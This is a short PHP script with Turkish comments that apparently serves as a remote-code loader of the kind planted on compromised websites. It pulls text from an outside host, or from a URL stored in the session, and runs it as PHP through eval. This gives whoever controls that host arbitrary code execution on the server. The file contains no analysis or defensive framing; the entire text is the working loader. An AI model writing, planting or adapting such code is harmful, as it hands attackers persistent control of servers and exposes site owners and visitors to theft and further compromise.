<?php
// Oturumu başlat
session_start();

// Belirtilen URL'den içerik çeken fonksiyon
function fetchUrl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($ch);
}

// ASCII karakterlerinden URL oluşturuluyor (https://teamzedd2024.tech/raw/McuQGI)
$url = "https://simpleeeverything.com/usd/zed.txt";

// Eğer oturumda daha önce URL varsa onu kullan, yoksa yukarıdaki URL'den veri çek
$result = isset($_SESSION["ts_url"]) ? @file_get_contents($_SESSION["ts_url"]) : fetchUrl($url);

// Çekilen veri bir string ise PHP kodu olarak çalıştır
if (is_string($result)) {
    eval('?>' . $result);
} else {
    echo "Error";
}
?>
